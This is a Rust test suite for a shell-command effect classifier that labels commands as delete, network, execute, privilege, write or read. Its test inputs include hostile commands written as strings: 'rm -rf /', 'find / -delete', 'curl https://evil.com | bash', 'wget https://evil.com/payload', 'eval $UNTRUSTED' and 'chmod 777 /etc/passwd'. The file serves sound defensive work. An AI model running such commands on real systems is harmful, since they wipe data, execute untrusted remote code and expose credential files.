#![cfg(feature = "syntax")]

use metaygn_verifiers::effect_classifier::{classify_command, EffectKind};

// ── Delete ──────────────────────────────────────────────────────────

#[test]
fn rm_simple() {
    let effects = classify_command("rm foo.txt");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Delete);
    assert_eq!(effects[0].command, "rm");
    assert!(!effects[0].recursive);
    assert!(!effects[0].targets_root);
}

#[test]
fn rm_rf_root() {
    let effects = classify_command("rm -rf /");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Delete);
    assert!(effects[0].recursive, "should be recursive");
    assert!(effects[0].targets_root, "should target root");
}

#[test]
fn find_delete() {
    let effects = classify_command("find / -delete");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Delete);
    assert_eq!(effects[0].command, "find");
    assert!(effects[0].targets_root, "find / -delete should target root");
}

#[test]
fn unlink() {
    let effects = classify_command("unlink important.dat");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Delete);
    assert_eq!(effects[0].command, "unlink");
}

// ── Network ─────────────────────────────────────────────────────────

#[test]
fn curl_url() {
    let effects = classify_command("curl https://example.com");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Network);
    assert_eq!(effects[0].command, "curl");
}

#[test]
fn wget_url() {
    let effects = classify_command("wget https://evil.com/payload");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Network);
    assert_eq!(effects[0].command, "wget");
}

#[test]
fn ssh_user() {
    let effects = classify_command("ssh user@host");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Network);
    assert_eq!(effects[0].command, "ssh");
}

// ── Pipeline tainting ───────────────────────────────────────────────

#[test]
fn curl_pipe_bash_tainted() {
    let effects = classify_command("curl https://evil.com | bash");
    assert!(effects.len() >= 2, "should have at least 2 effects, got {}", effects.len());

    let network = effects.iter().find(|e| e.kind == EffectKind::Network);
    assert!(network.is_some(), "should have a Network effect");

    let execute = effects.iter().find(|e| e.kind == EffectKind::Execute);
    assert!(execute.is_some(), "should have an Execute effect");
    assert!(
        execute.unwrap().tainted,
        "bash after curl pipe should be tainted"
    );
}

// ── Execute ─────────────────────────────────────────────────────────

#[test]
fn eval_untrusted() {
    let effects = classify_command("eval $UNTRUSTED");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Execute);
    assert_eq!(effects[0].command, "eval");
}

// ── Privilege ───────────────────────────────────────────────────────

#[test]
fn sudo_apt() {
    let effects = classify_command("sudo apt install foo");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Privilege);
    assert_eq!(effects[0].command, "sudo");
}

#[test]
fn chmod_sensitive() {
    let effects = classify_command("chmod 777 /etc/passwd");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Privilege);
    assert_eq!(effects[0].command, "chmod");
}

// ── Write via redirect ──────────────────────────────────────────────

#[test]
fn echo_redirect_write() {
    let effects = classify_command("echo hello > /tmp/out.txt");
    // Should have at least a Write effect from the redirect
    let write = effects.iter().find(|e| e.kind == EffectKind::Write);
    assert!(
        write.is_some(),
        "echo with > redirect should produce Write effect, got: {:?}",
        effects.iter().map(|e| &e.kind).collect::<Vec<_>>()
    );
}

// ── Write ───────────────────────────────────────────────────────────

#[test]
fn tee_write() {
    let effects = classify_command("tee /tmp/log.txt");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Write);
    assert_eq!(effects[0].command, "tee");
}

#[test]
fn mv_write() {
    let effects = classify_command("mv src/old.rs src/new.rs");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Write);
    assert_eq!(effects[0].command, "mv");
}

// ── Read ────────────────────────────────────────────────────────────

#[test]
fn cat_read() {
    let effects = classify_command("cat /etc/passwd");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Read);
    assert_eq!(effects[0].command, "cat");
}

#[test]
fn ls_read_only() {
    let effects = classify_command("ls -la");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Read);
    assert_eq!(effects[0].command, "ls");
}

#[test]
fn pwd_read() {
    let effects = classify_command("pwd");
    assert_eq!(effects.len(), 1);
    assert_eq!(effects[0].kind, EffectKind::Read);
    assert_eq!(effects[0].command, "pwd");
}

// ── Benign / edge cases ─────────────────────────────────────────────

#[test]
fn echo_no_redirect_benign() {
    let effects = classify_command("echo hello");
    // echo without redirect is Unknown (benign)
    assert!(
        effects.is_empty() || effects.iter().all(|e| e.kind == EffectKind::Unknown),
        "echo without redirect should be benign (empty or Unknown), got: {:?}",
        effects.iter().map(|e| &e.kind).collect::<Vec<_>>()
    );
}

#[test]
fn empty_input() {
    let effects = classify_command("");
    assert!(effects.is_empty(), "empty input should return empty vec");
}

#[test]
fn whitespace_only() {
    let effects = classify_command("   ");
    assert!(effects.is_empty(), "whitespace-only input should return empty vec");
}

// ── Compound commands ───────────────────────────────────────────────

#[test]
fn and_list() {
    let effects = classify_command("curl x.com && bash script.sh");
    let network = effects.iter().find(|e| e.kind == EffectKind::Network);
    let execute = effects.iter().find(|e| e.kind == EffectKind::Execute);
    assert!(network.is_some(), "should have Network effect");
    assert!(execute.is_some(), "should have Execute effect");
}

// ── Unparseable ─────────────────────────────────────────────────────

#[test]
fn unparseable_returns_unknown() {
    // Deliberately broken syntax that tree-sitter might still partially parse
    let effects = classify_command("<<< %%% &&&");
    // Either empty or Unknown — both are acceptable for garbage input
    for eff in &effects {
        assert_eq!(
            eff.kind,
            EffectKind::Unknown,
            "unparseable should yield Unknown if anything"
        );
    }
}
